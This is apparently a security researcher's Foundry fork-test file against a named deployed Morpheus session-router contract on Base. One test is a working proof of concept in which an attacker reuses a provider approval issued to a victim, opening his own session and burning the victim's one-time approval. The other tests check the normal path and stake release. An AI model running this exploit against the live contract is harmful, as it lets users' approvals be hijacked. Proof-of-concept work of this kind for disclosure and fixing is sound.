// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Harness, IERC20} from "./Harness.sol";

interface IDiamond {
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] calldata tags_
    ) external;
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function getUserStakesOnHold(address user_, uint8 iterations_) external view returns (uint256, uint256);
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function getIsProviderApprovalUsed(bytes calldata approval_) external view returns (bool);
    function getSessionEnd(uint256 amount_, uint256 pricePerSecond_, uint128 openedAt_) external view returns (uint128);
}

/// @title Morpheus LumerinDiamond (Base) — SessionRouter approval binding + stipend release path
/// @notice Fork tests against the DEPLOYED diamond 0x6aBE1d282f72B474E54527D93b979A4f64d3030a
///         pinned at Base block 56,849,002. All actors are fresh unprivileged accounts;
///         the provider key is our own test provider (provider registration is permissionless).
contract SessionApprovalTest is Harness {
    address internal constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address internal constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 internal constant BASE_FORK_BLOCK = 56849002;
    uint256 internal constant PRICE = 1e12; // 1e12 wei/s, inside live [1e10, 1e16] bounds
    uint256 internal constant STAKE = 100 ether; // session stake

    uint256 internal providerPk = 0xA11CE;
    uint256 internal victimPk = 0xB0B;
    uint256 internal attackerPk = 0xA77AC;

    IDiamond internal diamond = IDiamond(DIAMOND);
    IERC20 internal mor = IERC20(MOR);

    address internal provider;
    address internal victim;
    address internal attacker;
    bytes32 internal bidId;

    function setUp() public {
        vm.createSelectFork("base", BASE_FORK_BLOCK);
        provider = vm.addr(providerPk);
        victim = vm.addr(victimPk);
        attacker = vm.addr(attackerPk);

        _dealMor(provider, 10 ether);
        _dealMor(victim, 1000 ether);
        _dealMor(attacker, 1000 ether);
        address modelOwner = vm.addr(0xDE11);
        _dealMor(modelOwner, 10 ether);

        // Permissionless provider registration (min stake 0.2 MOR live).
        vm.startPrank(provider);
        mor.approve(DIAMOND, type(uint256).max);
        diamond.providerRegister(provider, 0.2 ether, "https://provider.test");
        vm.stopPrank();

        // Permissionless model registration (min stake 0.1 MOR live).
        bytes32 baseModelId = keccak256("poc-model");
        vm.startPrank(modelOwner);
        mor.approve(DIAMOND, type(uint256).max);
        string[] memory tags = new string[](0);
        diamond.modelRegister(modelOwner, baseModelId, bytes32(0), 0, 0.1 ether, "poc", tags);
        vm.stopPrank();
        bytes32 modelId = diamond.getModelId(modelOwner, baseModelId);

        // Provider posts a bid (bid fee 0.3 MOR live).
        vm.prank(provider);
        bidId = diamond.postModelBid(provider, modelId, PRICE);
    }

    /// @dev MOR (Base OFT) keeps `_balances` at storage slot 5 (probed against a live holder).
    function _dealMor(address account_, uint256 amount_) internal {
        bytes32 loc = keccak256(abi.encode(account_, uint256(5)));
        vm.store(MOR, loc, bytes32(amount_));
    }

    function _approvalFor(address user_, uint128 ts_) internal view returns (bytes memory) {
        return abi.encode(bidId, block.chainid, user_, ts_);
    }

    /// @notice BUG PoC: a provider approval issued for the VICTIM is consumed by the ATTACKER
    ///         to open a session for himself. The deployed SessionRouter decodes the approval's
    ///         user field and never compares it with `user_`; the interface still declares
    ///         `SessionApprovedForAnotherUser` but nothing ever throws it.
    function test_approvalNotBoundToUser() public {
        bytes memory approval = _approvalFor(victim, uint128(block.timestamp));
        bytes memory sig = _signEth(keccak256(approval), providerPk);

        // Negative control: a signature from the WRONG key must revert.
        bytes memory badSig = _signEth(keccak256(approval), attackerPk);
        vm.startPrank(attacker);
        mor.approve(DIAMOND, type(uint256).max);
        vm.expectRevert();
        diamond.openSession(attacker, STAKE, true, approval, badSig);
        vm.stopPrank();

        uint256 attackerBefore = mor.balanceOf(attacker);

        // ATTACK: attacker consumes the victim-bound approval for his own session.
        vm.prank(attacker);
        bytes32 sessionId = diamond.openSession(attacker, STAKE, true, approval, sig);

        assertTrue(sessionId != bytes32(0), "session opened by attacker with victim approval");
        assertEq(mor.balanceOf(attacker), attackerBefore - STAKE, "attacker stake pulled");
        assertTrue(diamond.getIsProviderApprovalUsed(approval), "approval marked used");

        // Griefing leg: the victim's own open with his own approval now reverts
        // (SessionDuplicateApproval) — the one-time approval was burned by the attacker.
        vm.startPrank(victim);
        mor.approve(DIAMOND, type(uint256).max);
        vm.expectRevert();
        diamond.openSession(victim, STAKE, true, approval, sig);
        vm.stopPrank();
    }

    /// @notice Positive control: the victim CAN open with his own approval when it is fresh.
    function test_victimOpensWithOwnApproval() public {
        bytes memory approval = _approvalFor(victim, uint128(block.timestamp));
        bytes memory sig = _signEth(keccak256(approval), providerPk);

        vm.startPrank(victim);
        mor.approve(DIAMOND, type(uint256).max);
        bytes32 sessionId = diamond.openSession(victim, STAKE, true, approval, sig);
        vm.stopPrank();

        assertTrue(sessionId != bytes32(0), "victim session opened");
    }

    /// @notice H1 fix-path validation (issue #62 class): open -> same-day close with a valid
    ///         provider receipt -> part of the stake is day-locked -> after releaseAt the user
    ///         withdraws the locked part via withdrawUserStakes() through the diamond.
    function test_closeLockAndWithdrawUserStakes() public {
        bytes memory approval = _approvalFor(victim, uint128(block.timestamp));
        bytes memory sig = _signEth(keccak256(approval), providerPk);

        vm.startPrank(victim);
        mor.approve(DIAMOND, type(uint256).max);
        bytes32 sessionId = diamond.openSession(victim, STAKE, true, approval, sig);
        vm.stopPrank();

        uint256 openedAt = block.timestamp;
        uint256 providerBefore = mor.balanceOf(provider);

        // One hour of consumption, then close with a valid provider-signed receipt.
        vm.warp(openedAt + 3600);
        bytes memory receipt = abi.encode(sessionId, block.chainid, uint128(block.timestamp), uint32(1000), uint32(100));
        bytes memory receiptSig = _signEth(keccak256(receipt), providerPk);
        vm.prank(victim);
        diamond.closeSession(receipt, receiptSig);

        // Provider was paid for the consumed hour out of the stake (direct payment).
        uint256 providerPaid = mor.balanceOf(provider) - providerBefore;
        assertGt(providerPaid, 0, "provider paid at close");

        // Part of the remaining stake is day-locked (stipend-recycle protection).
        (uint256 available, uint256 hold) = diamond.getUserStakesOnHold(victim, 255);
        assertEq(available, 0, "nothing available before release");
        assertGt(hold, 0, "part of stake is day-locked after close");
        uint256 victimAfterClose = mor.balanceOf(victim);
        uint256 refundedAtClose = victimAfterClose - (1000 ether - STAKE);
        assertEq(refundedAtClose + hold + providerPaid, STAKE, "stake conservation at close");

        // Withdrawing before releaseAt must revert.
        vm.prank(victim);
        vm.expectRevert();
        diamond.withdrawUserStakes(victim, 255);

        // After releaseAt (start of next day after the session end day) the lock is withdrawable.
        vm.warp(block.timestamp + 2 days);
        (uint256 available2, uint256 hold2) = diamond.getUserStakesOnHold(victim, 255);
        assertEq(hold2, 0, "hold released");
        assertEq(available2, hold, "full locked amount available");

        vm.prank(victim);
        diamond.withdrawUserStakes(victim, 255);
        assertEq(mor.balanceOf(victim), victimAfterClose + hold, "locked stake withdrawn in full");
        (uint256 available3, uint256 hold3) = diamond.getUserStakesOnHold(victim, 255);
        assertEq(available3 + hold3, 0, "on-hold array drained");
    }
}
